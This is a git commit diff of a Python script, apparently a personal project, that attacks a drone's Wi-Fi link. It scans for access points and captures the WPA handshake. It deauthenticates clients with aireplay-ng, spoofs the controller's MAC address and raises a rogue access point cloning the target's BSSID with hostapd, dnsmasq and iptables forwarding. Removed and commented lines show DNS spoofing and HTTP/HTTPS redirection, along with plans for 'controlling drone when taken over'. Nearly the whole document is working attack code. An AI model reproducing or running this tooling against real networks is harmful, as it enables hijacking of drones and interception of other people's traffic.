5fd9ee2951fcf4b1c34d7171b4fa4395bde0dd79
ZakDH <zhargreaves1@gmail.com>
2022-04-14 19:04:16 +0100

    new

--- project.py
+++ project.py
@@ -7,6 +7,7 @@ import pandas as pd
 import psutil
 
 iface = ''
+iface1 = ''
 bssid_name = ""
 essid_name = ""
 channel_no = 0
@@ -19,18 +20,7 @@ def mac_extract():
     mac = data.iloc[2][0]
     return mac
     
-def ap_scanner():
-    print("Scanning for access points...")
-    print("press CTRL+C to stop the scanning")
-    print("Index \tChannel \t MAC \t\t ESSID")
-    cc = Process(target = change_channel)
-    cc.start()
-    #start the ap sniffer
-    sniff(iface = iface, prn = ap_sniffer)
-    #stop the ap sniffer
-    cc.terminate()
-    
-def ap_sniffer(pkt) :
+def ap_sniffer(pkt) : ##captures beacon frames
     global bssid_list, essid_list, channel_list
     # if packet has 802.11 layer
     if pkt.haslayer(Dot11Beacon):
@@ -46,6 +36,9 @@ def ap_sniffer(pkt) :
 def deauth(dist, bssid_name, iface):
     os.system(f"aireplay-ng -0 {dist} -a {bssid_name} {iface}")
 
+def deauth1(dist, client_mac, bssid_name, iface):
+    os.system(f"aireplay-ng -0 {dist} -c {client_mac} -a {bssid_name} {iface}")
+
 def handshake_capture():
         global essid_name, bssid_name, channel_no
         mac_adder = int(input("\nEnter the index of the network you want to target: ")) - 1
@@ -53,7 +46,7 @@ def handshake_capture():
         essid_name = essid_list[mac_adder]
         channel_no = channel_list[mac_adder]
         print("\nNetwork to target:\n")
-        print(channel_no,'\t',bssid_name,'\t', essid_name)
+        print(channel_no,'\t',bssid_name,'\t',   essid_name)
         dist = str(input("\nEnter the number of the packets [1-10000] (0 for unlimited number) "))
         print("Capturing 4-Way handshake [{}]...".format(bssid_name))
         #start deauthentication process
@@ -83,6 +76,7 @@ def disable_monitor(iface):
     except:
         os.system('Failed to setup interface in managed mode')
         sys.exit(1)
+    iface = "wlan0"
     return iface
 
 def change_channel():
@@ -96,51 +90,81 @@ def change_channel():
 def create_configs(iface, essid, channel_no):
     cf.create_hostapd(iface, essid, channel_no)
     cf.create_dnsmasq(iface)
-    cf.create_dhcpd(essid)
 
 def rogue_ap():
-    global iface, bssid_name
-    os.system('sudo killall dnsmasq')
-    os.system(f'ifconfig {iface} down')
-    os.system(f'macchanger --mac={bssid_name} {iface}')
-    os.system(f'ifconfig {iface} up')
-    os.system(f'ifconfig {iface} up 192.168.2.1 netmask 255.255.255.0')
-    os.system(f'ifconfig {iface} mtu 1400')
+    global iface1, bssid_name
+    #os.system('sudo killall dnsmasq')
+    os.system(f'ifconfig {iface1} down')
+    os.system(f'macchanger --mac={bssid_name} {iface1}')
+    os.system(f'ifconfig {iface1} up')
+    os.system(f'ifconfig {iface1} up 192.168.2.1 netmask 255.255.255.0')
+    #os.system(f'ifconfig {iface1} mtu 1400')
     os.system('route add -net 192.168.2.0 netmask 255.255.255.0 gw 192.168.2.1')
     #ip forwarding and adapter bridging
-    os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
-    os.system('iptables -t nat -A PREROUTING -p udp -j DNAT --to 192.168.2.1')
-    os.system('iptables -P FORWARD ACCEPT')
-    os.system(f'iptables --append FORWARD --in-interface {iface} -j ACCEPT')
     os.system('iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE')
-    os.system('iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 80')
-    os.system('iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 80')
-    #start configs
-    os.system("service apache2 start")
-    #os.system(f"dhcpd -cf dhcpd.conf -pf /var/run/dhcpd.pid {iface} | xterm -hold -e hostapd hostapd.conf")
-    os.system("dnsmasq -C dnsmasq.conf -d | xterm -hold -e hostapd hostapd.conf")
-    #dns spoofing server
-    #os.system(f"dnschef --interface 192.168.2.1 --fakeip 192.168.2.1 --fakedomain *.google.com,*.amazon.com")
+    os.system('iptables --append FORWARD --in-interface wlan0 -j ACCEPT')
+    os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
+    os.system("dnsmasq -C dnsmasq.conf -d | xterm -hold -e hostapd hostapd.conf") ##look at creating virtual interface connecting to the drone when rogue ap is up
+    ##and redirect and manipulate the data
     
 def main():
-    global iface, essid_name, bssid_name, channel_no
+    global iface,iface1, essid_name, bssid_name, channel_no
     iface = setup_monitor("wlan0")
+    iface1 = ("ap_wlan")
+    os.system(f"iw dev wlan0mon interface add {iface1} type monitor")
     print("\nWhen Done Press CTRL+C")
     time.sleep(2)
-    ap_scanner()
+    print("Scanning for access points...")
+    print("press CTRL+C to stop the scanning")
+    print("Index \tChannel \t MAC \t\t ESSID")
+    cc = Process(target = change_channel)
+    cc.start()
+    #start the ap sniffer
+    sniff(iface = iface, prn = ap_sniffer) 
+    cc.terminate()
+    cc.join()
     handshake_capture()
     client_mac = mac_extract()
-    print(client_mac)
-    print('CPU usage % is: ', psutil.cpu_percent(4) * 100)
-    print('RAM memory % used:', psutil.virtual_memory()[2])
+    os.system(f"ifconfig {iface} down")
+    os.system(f"ip link set dev {iface} address {client_mac}")
+    os.system(f"ifconfig {iface} up")
     print("Fake Access Point\nWhen Done Press CTRL+C")
     time.sleep(2.0)
-    create_configs(iface, essid_name, channel_no)
-    #da = Process(target = deauth(0, bssid_name, iface))
+    #iface = disable_monitor(iface)
+    create_configs(iface1, essid_name, channel_no)
+    print('Drone information:',essid_name, bssid_name, channel_no)
+    print('Drone controller info:',client_mac)
+    input("deauth in seperate window")
+    #da = Process(target = deauth, args = (0, bssid_name, iface))
     #da.start()
-    #rogue_ap()
-    #da.terminate() #look at improving rogue ap by forcing client to join the new ap - deauth original ap or dhcp starve
-    disable_monitor(iface)
-    
+    rogue_ap()
+    #da.terminate()
+
+#1st method to connecting to drone
+    #os.system(f"wpa_passphrase {essid_name} | sudo tee /etc/wpa_supplicant.conf")
+    #os.system(f"wpa_supplicant -c /etc/wpa_supplicant.conf -i {iface}")
+    #os.system('Connection to drone established')
+
+#2nd method to connecting to drone
+    #os.system('airmon-ng check kill')
+    #os.system('ifconfig wlan0 down')
+    #os.system(f'iwconfig wlan0 channel {channel_no}')
+    #os.system('ifconfig wlan0 up')
+    #os.system('dhclient -v wlan0')
+    #da = Process(target = deauth, args = (0, client_mac, bssid_name, iface))
+    #da.start()
+    #os.system(f'ifconfig wlan0 down')
+    #os.system(f'macchanger --mac={client_mac} wlan0')
+    #os.system(f"iwconfig wlan0 essid {essid_name}")
+    #os.system('Connection to drone established')
+    #os.system(f'ifconfig wlan0 up')
+    #os.system('dhclient -v wlan0')
+    #os.system("well done!!! now look at controlling drone when taken over!")
+    #os.system(f'iwconfig wlan0 essid {essid_name} channel {channel_no} ap {bssid_name}')
+    #os.system('ifconfig wlan0 up')
+    #os.system('dhclient -v wlan0')
+    #os.system('Connection to drone established')
+    #da.terminate()
+
 if __name__ == "__main__":
     main()
